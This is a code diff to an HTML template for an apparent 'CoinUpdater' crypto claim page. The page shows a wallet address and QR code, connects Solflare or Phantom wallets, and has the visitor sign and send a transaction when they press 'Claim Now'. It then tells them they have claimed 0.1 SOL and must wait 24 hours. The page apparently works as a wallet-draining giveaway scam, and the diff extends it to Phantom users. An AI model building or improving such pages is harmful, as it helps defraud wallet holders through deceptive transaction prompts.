@@ -49,7 +49,7 @@ HTML_TEMPLATE = """
   <p><code>{{ wallet }}</code></p>
   <img src="{{ qr_url }}" class="qr" alt="QR Code" />
   <p id="walletStatus">Wallet not connected</p>
-  <button id="connectWalletBtn" class="wallet-button" onclick="connectWallet()">Connect Wallet</button>
+  <button id="connectWalletBtn" class="wallet-button" onclick="connectWallet()" disabled>Connect Wallet</button>
   <button onclick="sendTransaction()" class="claim-button">Claim Now</button>
   <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
 
@@ -63,29 +63,50 @@ HTML_TEMPLATE = """
 
     let provider = null;
 
-    window.addEventListener('load', () => {
-      if (window.solflare?.isSolflare) {
+    function checkWalletProvider() {
+      if (window.solflare && window.solflare.isSolflare) {
         provider = window.solflare;
+        console.log("Detected Solflare wallet");
         document.getElementById("connectWalletBtn").disabled = false;
-        console.log("Solflare wallet detected");
+      } else if (window.solana && window.solana.isPhantom) {
+        provider = window.solana;
+        console.log("Detected Phantom wallet");
+        document.getElementById("connectWalletBtn").disabled = false;
       } else {
-        console.log("Solflare not detected.");
+        console.log("No supported wallet detected");
+        document.getElementById("walletStatus").innerText = "No Solflare or Phantom wallet detected";
       }
+    }
+
+    // Wait for DOM load and check wallet presence
+    window.addEventListener('load', () => {
+      checkWalletProvider();
+
+      // Some wallets inject asynchronously; listen for solflare readiness
+      window.addEventListener('solflare#initialized', () => {
+        console.log('Solflare initialized event detected');
+        checkWalletProvider();
+      });
     });
 
     async function connectWallet() {
-      if (!provider) return alert("Solflare not detected");
+      if (!provider) {
+        alert("No Solflare or Phantom wallet detected");
+        return;
+      }
       try {
+        // For Solflare and Phantom, use their connect() method:
         const res = await provider.connect();
         document.getElementById("walletStatus").innerText =
           "Wallet Connected: " + res.publicKey.toString();
       } catch (err) {
-        alert("Wallet connection failed");
+        console.error(err);
+        alert("Wallet connection failed or was rejected.");
       }
     }
 
     async function sendTransaction() {
-      if (!provider?.publicKey) {
+      if (!provider || !provider.publicKey) {
         alert("Please connect your wallet first.");
         return;
       }
@@ -102,12 +123,12 @@ HTML_TEMPLATE = """
       );
 
       try {
-        const { signature } = await provider.signAndSendTransaction(transaction);
-        await connection.confirmTransaction(signature);
-        alert("✅ Transaction sent. You've claimed 1 SOL. Please wait 24 hours.");
+        const signedTx = await provider.signAndSendTransaction(transaction);
+        await connection.confirmTransaction(signedTx.signature);
+        alert("✅ Transaction sent. You've claimed 0.1 SOL. Please wait 24 hours.");
       } catch (e) {
         console.error(e);
-        alert("❌ Transaction failed.");
+        alert("❌ Transaction failed or cancelled.");
       }
     }
 
